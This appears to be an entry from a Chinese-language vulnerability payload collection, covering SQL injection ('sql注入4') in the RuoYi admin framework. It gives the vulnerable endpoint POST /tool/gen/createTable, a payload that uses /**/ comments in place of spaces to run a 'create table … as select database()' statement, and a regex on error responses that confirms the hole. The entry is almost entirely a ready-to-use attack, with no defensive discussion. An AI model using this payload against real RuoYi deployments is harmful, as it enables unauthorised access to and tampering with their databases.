# 若依RuoYi系统sql注入4

若依 ｜ SQL注入 ｜ —
- **请求**：`POST /tool/gen/createTable HTTP/1.1`

**Payload**
```
sql=create/**/table/**/test/**/as/**/select/**/database()
```
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$